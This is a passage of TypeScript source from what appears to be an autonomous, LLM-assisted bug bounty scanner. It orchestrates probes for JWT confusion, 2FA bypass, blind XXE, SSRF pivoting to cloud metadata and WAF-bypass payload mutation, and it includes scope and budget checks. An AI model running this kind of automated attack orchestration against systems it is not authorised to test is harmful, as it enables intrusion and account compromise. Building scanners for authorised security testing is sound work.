          const hhResult = await hostHeaderProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of hhResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [], status: "pending", createdAt: Date.now() });
          }
          if (hhResult.vulns.length > 0) this.emit("hunt:host_header", { sessionId: this.state.sessionId, count: hhResult.vulns.length, techniques: hhResult.vulns.map(v => v.technique) });
        } catch (err) { logger.debug("[HunterEngine] Host header probe skipped", { err: String(err) }); }
      })(),

      // CRLF injection probing
      (async () => {
        try {
          const crlfResult = await crlfProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of crlfResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [], status: "pending", createdAt: Date.now() });
          }
          if (crlfResult.vulns.length > 0) this.emit("hunt:crlf", { sessionId: this.state.sessionId, count: crlfResult.vulns.length });
        } catch (err) { logger.debug("[HunterEngine] CRLF probe skipped", { err: String(err) }); }
      })(),

      // Cookie security flag checking
      (async () => {
        try {
          const cookieResult = await cookieFlagChecker.check(this.state.targetUrl, this.authHeaders);
          for (const hyp of cookieResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [], status: "pending", createdAt: Date.now() });
          }
          if (cookieResult.issues.length > 0) this.emit("hunt:cookie_flags", { sessionId: this.state.sessionId, issues: cookieResult.issues.length, sessionCookies: cookieResult.issues.filter(i => i.isSessionCookie).length });
        } catch (err) { logger.debug("[HunterEngine] Cookie flag check skipped", { err: String(err) }); }
      })(),

      // JS/SPA crawling — extract hidden API endpoints from JS bundles
      (async () => {
        try {
          const crawlResult = await deepCrawl(this.state.targetUrl, { maxDepth: 2, maxPages: 20, authHeaders: this.authHeaders });
          for (const hyp of crawlResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.targetUrl || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [], status: "pending", createdAt: Date.now() });
          }
          if (crawlResult.endpointsFound.length > 0) this.emit("hunt:endpoints_discovered", { sessionId: this.state.sessionId, count: crawlResult.endpointsFound.length, endpoints: crawlResult.endpointsFound.slice(0, 10).map(e => e.url), pagesVisited: crawlResult.pagesVisited });
        } catch (err) { logger.debug("[HunterEngine] JS/SPA crawl skipped", { err: String(err) }); }
      })(),

      // Backward planner — seed goal-directed attack path hypotheses
      (async () => {
        try {
          const plan = backwardPlanner.planHunt(
            this.state.sessionId,
            "account_compromise",
            { complexity: 0.5, wafDetected: false, cloudHosted: false, authRequired: !!this.authConfig },
            { programId: String(this.state.programId), programAge: 180, reportCount: 50, noveltyFloor: 0.2 }
          );
          for (const phase of plan.phases.slice(0, 2)) {
            for (const action of phase.actions.slice(0, 3)) {
              const vulnClass = action.toLowerCase().replace(/[^a-z_]/g, "_");
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: vulnClass || "misconfig",
                targetUrl: this.state.targetUrl,
                reasoning: `Backward planner: ${plan.goal} — ${phase.name}: ${action}`,
                confidence: 0.5, priority: 6,
                evidence: [], status: "pending", createdAt: Date.now(),
              });
            }
          }
          this.emit("hunt:plan_seeded", { sessionId: this.state.sessionId, goal: plan.goal, phases: plan.phases.length });
          this.emit("hunt:ai_reasoning", {
            sessionId: this.state.sessionId,
            task: "Strategic Planning",
            phase: "decision",
            summary: `Backward planner set goal: "${plan.goal}". ${plan.phases.length} attack phase(s) seeded.`,
          });
        } catch (err) { logger.debug("[HunterEngine] Backward planner seeding skipped", { err: String(err) }); }
      })(),

      // Tech-payload selector — extract tech stack and inject tech-specific hypotheses
      (async () => {
        try {
          const techObs = this.state.observations.find(o => o.source === "whatweb");
          const techList: string[] = [];
          if (techObs?.data?.technologies && Array.isArray(techObs.data.technologies)) {
            for (const entry of techObs.data.technologies) {
              if (typeof entry === "object" && entry !== null) {
                techList.push(...Object.keys(entry as Record<string, unknown>));
              }
            }
          }
          if (techList.length > 0) {
            const profile = techPayloadSelector.select(techList);
            for (const payload of profile.payloads.slice(0, 5)) {
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: payload.vulnClass,
                targetUrl: this.state.targetUrl,
                reasoning: `Tech-specific (${profile.detected.join(",")}): ${payload.description}`,
                confidence: 0.6, priority: 7,
                evidence: [], status: "pending", createdAt: Date.now(),
              });
            }
            if (profile.payloads.length > 0) this.emit("hunt:tech_payloads", { sessionId: this.state.sessionId, techs: profile.detected, payloadCount: profile.payloads.length });
          }
        } catch (err) { logger.debug("[HunterEngine] Tech payload selector skipped", { err: String(err) }); }
      })(),

      // Parameter discovery — find injectable params via batch fuzzing
      (async () => {
        try {
          const paramResult = await parameterDiscovery.discover(this.state.targetUrl, this.authHeaders);
          for (const hyp of paramResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (paramResult.discovered.length > 0) {
            this.emit("hunt:params_discovered", { sessionId: this.state.sessionId, count: paramResult.discovered.length, params: paramResult.discovered.slice(0, 10).map(p => p.name) });
          }
        } catch (err) { logger.debug("[HunterEngine] Parameter discovery skipped", { err: String(err) }); }
      })(),

      // OAuth probe — detect OAuth/OIDC flows and test for misconfigurations
      (async () => {
        try {
          const oauthResult = await oauthProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of oauthResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (oauthResult.vulns.length > 0) {
            this.emit("hunt:oauth_vulns", { sessionId: this.state.sessionId, count: oauthResult.vulns.length, issues: oauthResult.vulns.map(v => v.issue) });
          }
        } catch (err) { logger.debug("[HunterEngine] OAuth probe skipped", { err: String(err) }); }
      })(),

      // Mass assignment probe — test for privileged field injection on update/register endpoints
      (async () => {
        try {
          const maResult = await massAssignmentProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of maResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (maResult.vulns.length > 0) {
            this.emit("hunt:mass_assignment", { sessionId: this.state.sessionId, count: maResult.vulns.length, endpoints: maResult.vulns.map(v => v.endpoint) });
          }
        } catch (err) { logger.debug("[HunterEngine] Mass assignment probe skipped", { err: String(err) }); }
      })(),

      // Business logic probe — test cart, coupon, pricing flows for logic flaws
      (async () => {
        try {
          const bizResult = await businessLogicProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of bizResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (bizResult.vulns.length > 0) {
            this.emit("hunt:business_logic", { sessionId: this.state.sessionId, count: bizResult.vulns.length, types: [...new Set(bizResult.vulns.map(v => v.technique))] });
          }
        } catch (err) { logger.debug("[HunterEngine] Business logic probe skipped", { err: String(err) }); }
      })(),

      // 2FA bypass probe — test for OTP skip, null code, step skip attacks
      (async () => {
        try {
          const tfaResult = await twoFactorBypassProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of tfaResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (tfaResult.vulns.length > 0) {
            this.emit("hunt:2fa_bypass", { sessionId: this.state.sessionId, count: tfaResult.vulns.length, techniques: tfaResult.vulns.map(v => v.technique) });
          }
        } catch (err) { logger.debug("[HunterEngine] 2FA bypass probe skipped", { err: String(err) }); }
      })(),

      // JWT confusion probe — alg:none, weak secrets, kid injection
      (async () => {
        try {
          const jwtResult = await jwtConfusionProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of jwtResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (jwtResult.vulns.length > 0) {
            this.emit("hunt:jwt_vulns", { sessionId: this.state.sessionId, count: jwtResult.vulns.length, techniques: jwtResult.vulns.map(v => v.technique) });
          }
        } catch (err) { logger.debug("[HunterEngine] JWT confusion probe skipped", { err: String(err) }); }
      })(),

      // Open redirect chain probe — detect open redirects and chain to OAuth/XSS
      (async () => {
        try {
          const orResult = await openRedirectChainProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of orResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (orResult.vulns.length > 0) {
            this.emit("hunt:open_redirect", { sessionId: this.state.sessionId, count: orResult.vulns.length, chained: orResult.vulns.filter(v => v.chainable).length });
          }
        } catch (err) { logger.debug("[HunterEngine] Open redirect chain probe skipped", { err: String(err) }); }
      })(),

      // Blind XXE probe — OOB-based XML external entity detection
      (async () => {
        try {
          const xxeResult = await blindXXEProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of xxeResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (xxeResult.vulns.length > 0) {
            this.emit("hunt:xxe_found", { sessionId: this.state.sessionId, count: xxeResult.vulns.length, oobConfirmed: xxeResult.vulns.some(v => v.oobReceived) });
          }
        } catch (err) { logger.debug("[HunterEngine] Blind XXE probe skipped", { err: String(err) }); }
      }),
      ]);
    }
  }

  private async probeGraphQL(): Promise<void> {
    const endpoints = await graphqlProber.detectEndpoints(this.state.targetUrl, this.authHeaders);
    if (!endpoints.length) return;

    for (const ep of endpoints) {
      const schema = await graphqlProber.introspect(ep, this.authHeaders);
      if (!schema) continue;

      const seeds = graphqlProber.toHypothesisSeeds(schema);
      for (const seed of seeds) {
        this.state.hypotheses.push({
          id: uuidv4(),
          vulnClass: seed.vulnClass,
          targetUrl: seed.targetUrl,
          reasoning: seed.reasoning,
          confidence: seed.confidence,
          priority: seed.priority,
          evidence: [],
          status: "pending",
          createdAt: Date.now(),
        });
      }

      this.emit("hunt:graphql_schema", {
        sessionId: this.state.sessionId,
        endpoint: ep,
        typeCount: schema.typeCount,
        injectableCount: schema.injectableArgs.length,
      });
      logger.info("[HunterEngine] GraphQL schema mapped", { endpoint: ep, typeCount: schema.typeCount });

      if (this.state.hypotheses.length > MAX_HYPOTHESES) {
        this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
        this.state.hypotheses.splice(MAX_HYPOTHESES);
      }
    }
  }

  private extractVersionedTechs(techObs: Record<string, unknown>): Array<{ name: string; version?: string }> {
    const raw = techObs.technologies;
    if (!Array.isArray(raw)) return [];

    const results: Array<{ name: string; version?: string }> = [];
    for (const entry of raw) {
      if (typeof entry !== 'object' || entry === null) continue;
      for (const [pluginName, pluginData] of Object.entries(entry as Record<string, unknown>)) {
        if (pluginName === 'target_uri' || pluginName === 'http_status') continue;
        const nameNorm = pluginName.toLowerCase().replace(/[^a-z0-9]/g, '');
        if (CVE_SEED_BLOCKLIST.has(nameNorm) || !CVE_SEED_ALLOWLIST.has(nameNorm)) continue;
        const versionMatch = JSON.stringify(pluginData).match(/(\d+\.\d+[\d.]*)/);
        results.push({ name: pluginName, version: versionMatch?.[1] });
      }
    }
    return results.slice(0, 3);
  }

  private async seedCVEHypotheses(techObs: Record<string, unknown>): Promise<void> {
    const techs = this.extractVersionedTechs(techObs);
    if (!techs.length) return;

    for (const { name, version } of techs) {
      const cves = await nvdClient.lookupByKeyword(name, version);
      const highCves = cves.filter(c => c.cvssScore >= 7.0);
      if (!highCves.length) continue;

      for (const cve of highCves.slice(0, 2)) {
        const cweNum = parseInt((cve.cweIds[0] ?? '').replace('CWE-', ''), 10);
        const vulnClass = CWE_TO_VULN_CLASS[cweNum] ?? 'misconfig';

        const hypothesis: Hypothesis = {
          id: uuidv4(),
          vulnClass,
          targetUrl: this.state.targetUrl,
          reasoning: `CVE-seeded: ${cve.id} (CVSS ${cve.cvssScore}) in ${name}${version ? ` ${version}` : ''} — ${cve.description.slice(0, 200)}`,
          confidence: 0.7,
          priority: cve.cvssScore >= 9.0 ? 10 : 8,
          evidence: [],
          status: 'pending',
          createdAt: Date.now(),
        };

        this.state.hypotheses.push(hypothesis);
        logger.info('[HunterEngine] CVE hypothesis seeded', { cveId: cve.id, vulnClass, cvss: cve.cvssScore });
      }

      this.emit('hunt:cve_seeded', {
        sessionId: this.state.sessionId,
        tech: `${name}${version ? ` ${version}` : ''}`,
        cveIds: highCves.slice(0, 5).map(c => c.id),
        maxCvss: Math.max(...highCves.map(c => c.cvssScore)),
      });
    }

    if (this.state.hypotheses.length > MAX_HYPOTHESES) {
      this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
      this.state.hypotheses.splice(MAX_HYPOTHESES);
    }
  }

  // ── Phase 2: Hypothesize ────────────────────────────────────────────────────
  private async hypothesize(): Promise<void> {
    logger.info("HYPOTHESIZE phase", { session: this.state.sessionId });

    const context = this.buildContext();

    // Pull smart orchestration template as structured context
    const chainTemplate = promptKB.render("smart_tool_chain", {
      goal: "vulnerability hypothesis generation",
      current_findings: `${this.state.confirmedFindings.length} confirmed, ${this.state.observations.length} observations`,
    });

    // Build a rich query text from actual observation signals for semantic retrieval
    // Compress old observations into a historical state vector so the prompt
    // doesn't grow unboundedly across many iterations (context window management).
    // Yield before and after the synchronous compression work so concurrent
    // socket events and sibling hunts aren't starved on a busy event loop.
    await this.yieldToEventLoop();
    const { historicalSummary, recentObservations } = observationCompressor.compress(
      this.state.sessionId,
      this.state.observations,
    );
    await this.yieldToEventLoop();
    const recentObs = recentObservations;
    const obsTags = [...new Set(recentObs.flatMap(o => o.tags))].join(', ');
    const confirmedClasses = [...new Set(this.state.confirmedFindings.map(f => f.hypothesis.vulnClass ?? ''))].join(', ');
    const semanticQuery = [
      `Target: ${this.state.targetUrl}`,
      obsTags ? `Signals observed: ${obsTags}` : '',
      confirmedClasses ? `Confirmed vulnerability classes: ${confirmedClasses}` : '',
      `Hypothesizing: what vulnerabilities are most likely on this target`,
    ].filter(Boolean).join('. ');

    const domainKnowledge = await jsonPromptLoader.getContextBlockAsync(semanticQuery, 7);

    // ── RAG: RL framework priorities ──────────────────────────────────────────
    // If observations contain recognized framework tags, pull historically
    // successful vuln classes from the reinforcement store.
    const allObsTags = recentObs.flatMap(o => o.tags);
    const detectedFrameworks = [...new Set(
      allObsTags.filter(t => /express|spring|django|rails|laravel|wordpress|flask|next|nuxt|strapi/i.test(t))
    )];
    let rlPriorityHint = '';
    for (const fw of detectedFrameworks.slice(0, 2)) {
      const priorities = await this.rlWiring.getFrameworkPriorities(fw);
      if (priorities.length > 0) {
        rlPriorityHint += `RL history: ${fw} targets have yielded ${priorities.slice(0, 5).join(', ')}. `;
      }
    }

    // ── RAG: promptKB methodology hints ──────────────────────────────────────
    // Inject structured attack objectives from the KB for observed candidate
    // vuln classes so the model knows the expected exploitation approach.
    const KNOWN_VULN_TAGS = new Set(['sqli','xss','ssrf','idor','rce','lfi','xxe','csrf','cors','open_redirect']);
    const candidateVulns = [...new Set(allObsTags.filter(t => KNOWN_VULN_TAGS.has(t)))].slice(0, 3);
    let methodologyHints = '';
    for (const vc of candidateVulns) {
      const templates = promptKB.getForVulnClass(vc);
      if (templates.length > 0) {
        const objMatch = templates[0].template.match(/Objective:\n((?:- .+\n?)+)/);
        if (objMatch) {
          methodologyHints += `${vc.toUpperCase()} — ${objMatch[1].trim().slice(0, 220)}\n`;
        }
      }
    }

    const prompt = `You are an expert security researcher performing bug bounty hunting. \
Think step by step before generating hypotheses.

Step 1 — Interpret the observations: what do the signals imply about the stack, \
authentication model, and likely attack surface?
Step 2 — Identify prerequisite conditions: which vulnerability classes have their \
preconditions already satisfied by what you've observed?
Step 3 — Estimate what confirming evidence would look like for each candidate class.
Step 4 — Output your hypotheses as JSON.

Target: ${this.state.targetUrl}
${historicalSummary ? `${historicalSummary}\n\n` : ''}Recent observations (anomaly-sorted):
${JSON.stringify(recentObs, null, 2)}

Current confirmed findings: ${this.state.confirmedFindings.length}
Previously tested hypotheses: ${this.state.hypotheses.length}

Orchestration context:
${chainTemplate.split('\n').slice(0, 8).join('\n')}

${toolKnowledge.getSummaryBlock()}
${domainKnowledge ? `\nRelevant domain knowledge and past examples:\n${domainKnowledge}\n` : ''}${rlPriorityHint ? `\nCross-hunt intelligence: ${rlPriorityHint}\n` : ''}${methodologyHints ? `\nAttack methodology for observed candidates:\n${methodologyHints}` : ''}
Generate 3-5 specific vulnerability hypotheses based on the observations.
Each hypothesis must have:
- vulnClass: (xss/sqli/ssrf/idor/lfi/rce/auth_bypass/info_disclosure/misconfig/open_redirect/cors/csrf/xxe)
- targetUrl: specific URL or endpoint to test
- reasoning: why you believe this vulnerability exists
- confidence: 0.0-1.0 based on evidence strength
- priority: 1-10 (10=highest)

Return ONLY valid JSON array of hypothesis objects.`;

    this.emit("hunt:ai_reasoning", {
      sessionId: this.state.sessionId,
      task: "Hypothesis Generation",
      phase: "thinking",
      context: {
        observations: this.state.observations.length,
        hypotheses: this.state.hypotheses.length,
        iteration: this.state.iteration,
      },
      promptPreview: prompt.slice(0, 600),
    });

    const _aiReasoningStart = Date.now();
    try {
      const response = await this.modelRouter.reason(prompt);
      const _aiReasoningMs = Date.now() - _aiReasoningStart;
      // Yield after model response so the event loop can process other callbacks
      // before the synchronous JSON.parse (which can be slow for large responses).
      await this.yieldToEventLoop();
      // Guard against prompt injection in LLM output before parsing
      try {
        const { promptInjectionDetector } = await import('../governance');
        const injection = promptInjectionDetector.detect(response, 'hunter-engine', 'HunterEngine');
        if (!injection.safe) {
          logger.warn('[HunterEngine] Prompt injection detected in model response', { score: injection.score, reasons: injection.reasons });
        }
      } catch { /* non-critical — governance unavailable */ }
      // Cap response slice to 64KB before parsing to prevent OOM from huge model outputs
      const rawSlice = response.match(/\[[\s\S]+\]/)?.[0]?.slice(0, 65536) || "[]";
      const parsed = JSON.parse(rawSlice);

      const newHypotheses: Hypothesis[] = parsed.map((h: Record<string, unknown>) => ({
        id: uuidv4(),
        vulnClass: h.vulnClass as string || "unknown",
        targetUrl: h.targetUrl as string || this.state.targetUrl,
        reasoning: h.reasoning as string || "",
        confidence: Math.min(1, Math.max(0, Number(h.confidence) || 0.5)),
        priority: Math.min(10, Math.max(1, Number(h.priority) || 5)),
        evidence: this.state.observations.filter(o => o.anomalyScore > 0.3),
        status: "pending" as const,
        createdAt: Date.now(),
        modelSource: this.modelRouter.lastProvider,
      }));

      // Sort by priority * confidence
      newHypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
      this.state.hypotheses.push(...newHypotheses);
      if (this.state.hypotheses.length > MAX_HYPOTHESES) {
        this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
        this.state.hypotheses.splice(MAX_HYPOTHESES);
      }

      this.emit("hunt:ai_reasoning", {
        sessionId: this.state.sessionId,
        task: "Hypothesis Generation",
        phase: "complete",
        rawResponse: response.slice(0, 3000),
        durationMs: _aiReasoningMs,
        generatedCount: newHypotheses.length,
      });
      this.emit("hunt:hypotheses", { count: newHypotheses.length, hypotheses: newHypotheses });
      logger.info("Generated hypotheses", { count: newHypotheses.length });
    } catch (err) {
      logger.error("Hypothesis generation failed", { err });
      // Fallback: generate default hypotheses based on common vuln classes
      this.generateDefaultHypotheses();
    }
  }

  private isBudgetExhausted(): boolean {
    return this.state.budget.requestsMade >= this.state.budget.maxRequests;
  }

  // ── Phase 3: Probe ──────────────────────────────────────────────────────────
  private async probe(): Promise<void> {
    logger.info("PROBE phase", { session: this.state.sessionId });

    // Refresh auth session if it expired mid-hunt (30-min TTL)
    if (this.authConfig) {
      try {
        const refreshed = await sessionManager.ensureSession(this.state.programId, this.authConfig);
        this.authHeaders = refreshed.headers;
      } catch { /* non-critical — continue unauthenticated */ }
    }

    const pending = this.state.hypotheses
      .filter(h => h.status === "pending")
      .slice(0, 3); // probe top 3 per iteration

    for (const hypothesis of pending) {
      // Pre-flight budget check — stop probing if we've hit the request cap
      if (this.isBudgetExhausted()) {
        logger.info("HunterEngine: Budget exhausted — halting probe phase", {
          requestsMade: this.state.budget.requestsMade,
          maxRequests: this.state.budget.maxRequests,
        });
        this.emit("hunt:budget_exhausted", {
          requestsMade: this.state.budget.requestsMade,
          maxRequests: this.state.budget.maxRequests,
        });
        break;
      }

      hypothesis.status = "probing";
      this.emit("hunt:probing", { hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass });

      // Scope check before probing
      const { allowed } = await this.scopeGuard.isInScope(hypothesis.targetUrl, this.state.programId);
      if (!allowed) {
        hypothesis.status = "rejected";
        continue;
      }

      // Select appropriate tool — honour retry hint if set, otherwise auto-select
      const toolName = hypothesis.toolHint || this.selectTool(hypothesis.vulnClass);
      delete hypothesis.toolHint;

      // On gray-zone retries (retryCount > 0), inject WAF-bypass payload mutations
      let probeUrl = hypothesis.targetUrl;
      if ((hypothesis.retryCount ?? 0) > 0) {
        const mutations = payloadMutator.mutate(hypothesis.vulnClass);
        if (mutations.length > 0) {
          const params = payloadMutator.findInjectableParams(hypothesis.targetUrl);
          if (params.length > 0 && mutations[0]) {
            probeUrl = payloadMutator.injectPayload(hypothesis.targetUrl, params[0], mutations[0].variant);
          }
        }
      }

      const probeResult = await this.runTool(toolName, probeUrl, hypothesis);

      // OOB beacon probe for blind/async vuln classes that don't produce immediate signals
      const oobClasses = ["ssrf", "xss", "sqli", "rce", "xxe"];
      let oobHit = false;
      if (oobClasses.includes(hypothesis.vulnClass) && !probeResult.found && !probeResult.injectable) {
        oobHit = await this.runOOBProbe(hypothesis.targetUrl, hypothesis.vulnClass);
      }

      const result: ProbeResult = {
        hypothesisId: hypothesis.id,
        tool: toolName,
        command: String(probeResult.command || ""),
        output: oobHit ? `OOB callback received — ${hypothesis.vulnClass} confirmed` : String(probeResult.rawOutput || ""),
        parsed: probeResult,
        success: Boolean(probeResult.found || probeResult.injectable || probeResult.count || oobHit),
        duration: Number(probeResult.duration || 0),
      };

      this.state.probes.push(result);
      if (this.state.probes.length > MAX_PROBES) this.state.probes.shift();
      this.state.budget.requestsMade += Number(probeResult.requestsMade || 1);
      this.rlWiring.onToolResult(toolName, hypothesis.vulnClass, result.success, hypothesis.confidence);
      const proxyId = egressAllocator.getCurrentAssignment(hypothesis.targetUrl) ?? 'direct';
      this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId });

      // Track consecutive failures; after 5+, do a canary HTTP check to confirm hard ban
      if (result.success || probeResult.hardBanned) {
        this.consecutiveFailures = 0;
      } else {
        this.consecutiveFailures++;
      }

      if (this.consecutiveFailures >= 5 && !this.banCheckDone) {
        this.banCheckDone = true;
        let canaryHostname = '';
        try {
          canaryHostname = new URL(hypothesis.targetUrl).hostname;
          const resp = await axios.head(hypothesis.targetUrl, { timeout: 3000, validateStatus: () => true });
          if (resp.status === 403) {
            dynamicRateLimiter.recordResponse(canaryHostname, '/', 403, resp.headers as Record<string, string>);
            this.hardBanned = true;
            this.emit('hunt:hard_banned', { target: canaryHostname, reason: 'IP hard-banned (403 confirmed after consecutive failures)' });
            logger.warn('[HunterEngine] Hard IP ban detected — terminating hunt early', { target: canaryHostname });
            break;
          }
        } catch (err: unknown) {
          // Network-level drops (ETIMEDOUT, ECONNRESET) indicate a broad IP block —
          // the target dropped our connection entirely rather than returning 403.
          const code = (err as { code?: string })?.code ?? '';
          if (code === 'ETIMEDOUT' || code === 'ECONNRESET' || code === 'ECONNREFUSED' || code === 'ENOTFOUND') {
            this.hardBanned = true;
            this.emit('hunt:hard_banned', { target: canaryHostname || hypothesis.targetUrl, reason: `IP hard-banned (network drop: ${code})` });
            logger.warn('[HunterEngine] Network-level block detected — terminating hunt early', { code, target: canaryHostname });
            break;
          }
        }
      }

      if (this.hardBanned) break;
    }
  }

  // ── Phase 4: Update ─────────────────────────────────────────────────────────
  private async update(): Promise<void> {
    logger.info("UPDATE phase", { session: this.state.sessionId });

    for (const hypothesis of this.state.hypotheses.filter(h => h.status === "probing")) {
      const relatedProbes = this.state.probes.filter(p => p.hypothesisId === hypothesis.id);
      const successful = relatedProbes.filter(p => p.success);

      if (successful.length > 0) {
        // AI-assisted confidence update
        const newConfidence = await this.updateConfidence(hypothesis, successful);
        hypothesis.confidence = newConfidence;

        if (newConfidence > 0.7) {
          hypothesis.status = "confirmed";
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, true);
          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, true);
          const confirmed = await this.buildConfirmedFinding(hypothesis, successful);
          this.state.confirmedFindings.push(confirmed);
          this.emit("hunt:finding_confirmed", { finding: confirmed });
          contextWriter.addFinding({
            id: confirmed.hypothesis.id,
            vulnClass: confirmed.hypothesis.vulnClass,
            severity: confirmed.severity,
            confidence: confirmed.hypothesis.confidence,
            endpoint: confirmed.hypothesis.targetUrl,
            payload: confirmed.exploitPayload,
            description: confirmed.hypothesis.reasoning.slice(0, 300),
            confirmedAt: new Date().toISOString(),
          });
          await this.persistFinding(confirmed);
          notificationService.notifyIfWorthy({
            type: "finding_confirmed",
            severity: confirmed.severity,
            vulnType: confirmed.hypothesis.vulnClass,
            targetUrl: confirmed.hypothesis.targetUrl,
            cvssScore: confirmed.cvssScore,
            detail: confirmed.hypothesis.reasoning.slice(0, 200),
          }).catch(() => {});

          // SSRF chain pivot — after SSRF confirmed, probe internal services
          if (hypothesis.vulnClass === "ssrf") {
            (async () => {
              try {
                const ssrfParam = ssrfChainProber.detectSSRFParam(hypothesis.targetUrl);
                const pivot = await ssrfChainProber.probe(hypothesis.targetUrl, ssrfParam, this.authHeaders);
                for (const ph of pivot.pivotHypotheses) {
                  this.state.hypotheses.push({
                    id: uuidv4(), vulnClass: ph.vulnClass, targetUrl: hypothesis.targetUrl,
                    reasoning: ph.reasoning, confidence: ph.confidence, priority: ph.priority,
                    evidence: [], status: "pending", createdAt: Date.now(),
                  });
                }
                if (pivot.reachableEndpoints.length > 0) {
                  this.emit("hunt:ssrf_pivot", {
                    sessionId: this.state.sessionId,
                    reachable: pivot.reachableEndpoints,
                    cloudMeta: !!pivot.cloudMetadata,
                    newHypotheses: pivot.pivotHypotheses.length,
                  });
                }
              } catch (err) {
                logger.debug("[HunterEngine] SSRF pivot non-critical", { err: String(err) });
              }
            })();
          }
          // Exploit chain seeding — if this vuln matches a chain step, seed next steps
          for (const [chainId, chain] of Object.entries(ATTACK_TREES)) {
            const matchingStep = chain.steps.find(s => s.vulnClass === hypothesis.vulnClass);
            if (!matchingStep) continue;
            const nextStep = chain.steps.find(s => s.stepNumber === matchingStep.stepNumber + 1);
            if (!nextStep) continue;
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: nextStep.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: `Exploit chain [${chain.name}] step ${nextStep.stepNumber}: ${nextStep.description}`,
              confidence: 0.65, priority: 9,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
            this.emit("hunt:chain_seeded", { sessionId: this.state.sessionId, chainId, chainName: chain.name, step: nextStep.stepNumber, vulnClass: nextStep.vulnClass });
            logger.info("[HunterEngine] Chain continuation seeded", { chainId, step: nextStep.stepNumber });
          }

        } else if (newConfidence < 0.2) {
          hypothesis.status = "rejected";
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, false);
          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, false);
        } else {
          // Gray zone (0.2–0.7): re-queue with a different tool, up to 2 retries
          hypothesis.retryCount = (hypothesis.retryCount || 0) + 1;
          if (hypothesis.retryCount < 2) {
            hypothesis.status = "pending";
            hypothesis.toolHint = this.getAlternateTool(hypothesis);
            logger.info("Hypothesis re-queued from gray zone", {
              id: hypothesis.id,
              vulnClass: hypothesis.vulnClass,
              confidence: newConfidence,
              retry: hypothesis.retryCount,
              nextTool: hypothesis.toolHint,
            });
          } else {
            hypothesis.status = "inconclusive"; // exhausted retries
          }
        }
      } else {
        if (relatedProbes.length > 0) {
          hypothesis.status = "rejected";
          this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, false);
